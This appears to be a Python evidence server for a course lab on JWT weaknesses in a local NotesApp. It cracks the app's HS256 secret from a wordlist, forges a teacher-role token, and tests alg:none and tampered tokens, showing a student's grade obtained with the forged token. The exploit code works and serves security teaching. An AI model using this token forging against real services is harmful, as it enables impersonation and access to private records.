#!/usr/bin/env python3
"""Live evidence page for the NotesApp JWT Part 2 lab.

The page does NOT contain recorded results: every request below is performed
again against the running local NotesApp each time the page is opened, so the
screenshot of this page shows live HTTP status codes and live response bodies
coming from 127.0.0.1:8082. API checks send no cookie; login/dashboard use a session.

Usage:  python part2-evidence-server.py --port 8099
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import http.client
import html
import json
import os
import re
import urllib.parse

BASE_HOST = "127.0.0.1"
BASE_PORT = 8082
BASE_URL = "http://127.0.0.1:8082"
WORDLIST = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "lab", "jwt-secrets.txt")


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def b64url_decode(value: str) -> bytes:
    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))


def request(method: str, path: str, headers: dict | None = None, body: bytes | None = None):
    conn = http.client.HTTPConnection(BASE_HOST, BASE_PORT, timeout=20)
    try:
        conn.request(method, path, body=body, headers=dict(headers or {}))
        resp = conn.getresponse()
        payload = resp.read().decode("utf-8", "replace")
        return resp.status, resp.reason, dict(resp.getheaders()), payload
    finally:
        conn.close()


def login_token():
    body = urllib.parse.urlencode({"username": "alice", "password": "alicepw"}).encode()
    _, _, headers, _ = request("POST", "/login",
                               {"Content-Type": "application/x-www-form-urlencoded"}, body)
    cookie = headers.get("Set-Cookie", "").split(";")[0]
    _, _, _, page = request("GET", "/dashboard", {"Cookie": cookie})
    match = re.search(r'const TOKEN\s*=\s*"([^"]+)"', page)
    return match.group(1) if match else None


def load_wordlist():
    path = WORDLIST
    words = []
    with open(path, encoding="utf-8") as handle:
        for line in handle:
            line = line.strip()
            if line and not line.startswith("#"):
                words.append(line)
    if not words:
        raise ValueError("wordlist contains no candidates")
    return path, words


def build():
    health_status, _, _, health_body = request("GET", "/healthz")
    real = login_token()
    if not real:
        raise RuntimeError("the application did not issue a real Alice token")
    header_b64, payload_b64, signature = real.split(".")

    path, words = load_wordlist()
    key = None
    tried = 0
    signing_input = f"{header_b64}.{payload_b64}".encode()
    for candidate in words:
        tried += 1
        digest = hmac.new(candidate.encode(), signing_input, hashlib.sha256).digest()
        if hmac.compare_digest(b64url(digest), signature):
            key = candidate
            computed = b64url(digest)
            break

    if key is None:
        raise RuntimeError("no wordlist candidate matches; no successful evidence page can be generated")

    def sign(payload: dict, secret: str):
        h = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
        p = b64url(json.dumps(payload).encode())
        d = hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
        return f"{h}.{p}.{b64url(d)}"

    teacher_payload = {"user_id": 2, "username": "prof.turing", "role": "teacher"}
    forged = sign(teacher_payload, key)
    none_tok = (b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode()) + "." +
                b64url(json.dumps(teacher_payload).encode()) + ".")
    tampered = forged[:-1] + ("A" if forged[-1] != "A" else "B")

    rows = [
        ("C1", "no credentials", "GET", "/api/notes/3", None),
        ("C2", "alg:none token (Part 1 style)", "GET", "/api/notes/3", none_tok),
        ("C3", "real alice JWT", "GET", "/api/notes/1", real),
        ("C4", "real alice JWT (Class 8 owner check)", "GET", "/api/notes/3", real),
        ("C5", "forged teacher JWT (wordlist key)", "GET", "/api/notes/3", forged),
        ("C6", "forged token, signature tampered", "GET", "/api/notes/3", tampered),
    ]
    results = []
    for cid, name, method, path_, token in rows:
        headers = {"Authorization": "Bearer " + token} if token else {}
        status, reason, rheaders, body = request(method, path_, headers)
        results.append((cid, name, method, path_, status, reason, body, headers))

    bob = None
    for row in results:
        if row[0] == "C5":
            try:
                bob = json.loads(row[6])
            except Exception:
                bob = None

    return render(results, bob, health_status, health_body, header_b64, payload_b64,
                  signature, key, computed, tried, len(words), path, real, forged, none_tok).replace("http://127.0.0.1:8082", BASE_URL)


def render(results, bob, health_status, health_body, header_b64, payload_b64, signature,
           key, computed, tried, total_words, wordlist_path, real_token, forged, none_tok):
    view = VIEW.get("view", "full")
    style = ("body{font-family:Consolas,'Courier New',monospace;background:#111;color:#ddd;padding:22px;"
             "box-sizing:border-box}"
             "h1{color:#7fd1ff;font-size:20px}h2{color:#ffd479;font-size:15px;margin-top:20px}"
             "table{border-collapse:collapse;width:100%;table-layout:fixed;margin-top:8px}"
             "td,th{border:1px solid #555;padding:6px 8px;text-align:left;font-size:12px;vertical-align:top;"
             "word-wrap:break-word;overflow-wrap:anywhere}"
             "th{background:#222}.ok{color:#7bff9b;font-weight:bold}.bad{color:#ff8080;font-weight:bold}"
             ".k{color:#ffd479}.note{color:#9fb3c8;font-size:12px}pre{margin:0;white-space:pre-wrap;"
             "word-break:break-all}.mono{font-size:11px;color:#cfe3ff}")

    def head(title):
        return (f"<!doctype html><html><head><meta charset='utf-8'><title>{title}</title>"
                f"<style>{style}</style></head><body>")

    def env_table():
        rows = [
            ("target", "http://127.0.0.1:8082 (local NotesApp work copy)"),
            ("/healthz", f"{health_status} {health_body}"),
            ("JWT_ALLOW_NONE", "false  ->  alg:none is refused (see C2)"),
            ("real JWT header", json.dumps(json.loads(b64url_decode(header_b64)))),
            ("real JWT payload", json.dumps(json.loads(b64url_decode(payload_b64)))),
        ]
        body = "".join(f"<tr><th>{html.escape(a)}</th><td>{html.escape(b)}</td></tr>" for a, b in rows)
        return f"<h2>Environment</h2><table>{body}</table>"

    def key_table():
        body = (f"<tr><th>wordlist</th><td>{html.escape(wordlist_path)}</td></tr>"
                f"<tr><th>candidates tried</th><td>{tried} / {total_words}</td></tr>"
                f"<tr><th>recovered HS256 secret</th><td class='k'>{html.escape(key)} "
                f"({len(key)} characters)</td></tr>"
                f"<tr><th>signing input (header.payload of the real JWT)</th>"
                f"<td>{html.escape(header_b64 + '.' + payload_b64)}</td></tr>"
                f"<tr><th>computed signature</th><td>{html.escape(computed)}</td></tr>"
                f"<tr><th>signature inside the real JWT</th><td>{html.escape(signature)}</td></tr>"
                f"<tr><th>identical</th><td class='ok'>{computed == signature}</td></tr>")
        return f"<h2>HS256 secret recovered from the course wordlist</h2><table>{body}</table>"

    def check_table(selected):
        body = ""
        for cid, name, method, path_, status, reason, resp_body, headers in results:
            if cid not in selected:
                continue
            req = f"{method} {path_}"
            if headers:
                value = list(headers.items())[0][1]
                shown = value if len(value) <= 40 else value[:40] + "..."
                sent = (f"<b>Authorization</b>: Bearer<br><span class='mono'>{html.escape(shown)}</span>"
                        f"<br><span class='note'>(no Cookie header was sent)</span>")
            else:
                sent = "<span class='note'>(no Authorization header, no Cookie header)</span>"
            cls = "ok" if status in (200, 401, 404) else "bad"
            short = resp_body.strip()
            if len(short) > 320:
                short = short[:320] + " ..."
            body += (f"<tr><td style='width:44px'>{cid}</td><td style='width:210px'>{html.escape(req)}"
                     f"<br><span class='note'>{html.escape(name)}</span></td>"
                     f"<td style='width:330px'>{sent}</td>"
                     f"<td style='width:110px' class='{cls}'>{status} {html.escape(reason)}</td>"
                     f"<td><pre>{html.escape(short)}</pre></td></tr>")
        return ("<h2>Live HTTP checks (fresh client, no cookie is sent)</h2>"
                "<table><tr><th>id</th><th>request</th><th>headers sent</th><th>status</th>"
                f"<th>response body</th></tr>{body}</table>")

    def bob_table():
        if not bob:
            return ""
        rows = [("note id", bob.get("id")), ("student", bob.get("student")),
                ("class", bob.get("class_name")), ("grade", bob.get("grade")),
                ("comment", bob.get("comment"))]
        body = "".join(f"<tr><th>{html.escape(str(a))}</th><td>{html.escape(str(b))}</td></tr>"
                       for a, b in rows)
        return f"<h2>What the forged teacher identity received on /api/notes/3</h2><table>{body}</table>"

    title = "Part 2 evidence"
    if view == "wordlist":
        out = (head(title) + "<h1>JWT Part 2 - recovering the weak HS256 key</h1>"
               "<p class='note'>Live values: the real JWT is taken from a fresh alice login and the "
               "candidates are tested against its signature while this page is rendered.</p>"
               + env_table() + key_table() + "</body></html>")
    elif view == "forged":
        out = (head(title) + "<h1>JWT Part 2 - forged teacher token accepted</h1>"
               "<p class='note'>The token below was signed with the key recovered from the wordlist. "
               "The request carries the Authorization header only - no cookie is sent.</p>"
               + key_table() + check_table({"C5"}) + bob_table() + "</body></html>")
    elif view == "rejected":
        out = (head(title) + "<h1>JWT Part 2 - unsigned and tampered tokens are refused</h1>"
               "<p class='note'>Part 1 style alg:none token and a token with one changed signature "
               "character. Both requests carry the Authorization header only - no cookie is sent.</p>"
               + check_table({"C1", "C2", "C4", "C6"}) + "</body></html>")
    else:
        out = (head(title) + "<h1>NotesApp JWT Part 2 - live evidence</h1>"
               "<p class='note'>Every value below was produced by a live request against "
               "http://127.0.0.1:8082 while this page was rendered.</p>"
               + env_table() + key_table() + check_table({"C1", "C2", "C3", "C4", "C5", "C6"})
               + bob_table() + "</body></html>")
    return out


VIEW = {}



def main():
    global BASE_HOST, BASE_PORT, BASE_URL, WORDLIST
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, default=8099)
    parser.add_argument("--base", default="http://127.0.0.1:8082")
    parser.add_argument("--wordlist", default=WORDLIST)
    args = parser.parse_args()
    from part2 import Lab
    validated = Lab(args.base)
    BASE_HOST, BASE_PORT, BASE_URL = validated.host, validated.port, args.base.rstrip("/")
    WORDLIST = os.path.abspath(args.wordlist)
    load_wordlist()
    from http.server import BaseHTTPRequestHandler, HTTPServer

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            parsed = urllib.parse.urlparse(self.path)
            VIEW["view"] = urllib.parse.parse_qs(parsed.query).get("view", ["full"])[0]
            page = build().encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(page)))
            self.end_headers()
            self.wfile.write(page)

        def log_message(self, *a):
            pass

    server = HTTPServer(("127.0.0.1", args.port), Handler)
    print(f"evidence server on http://127.0.0.1:{args.port}/")
    server.serve_forever()


if __name__ == "__main__":
    main()
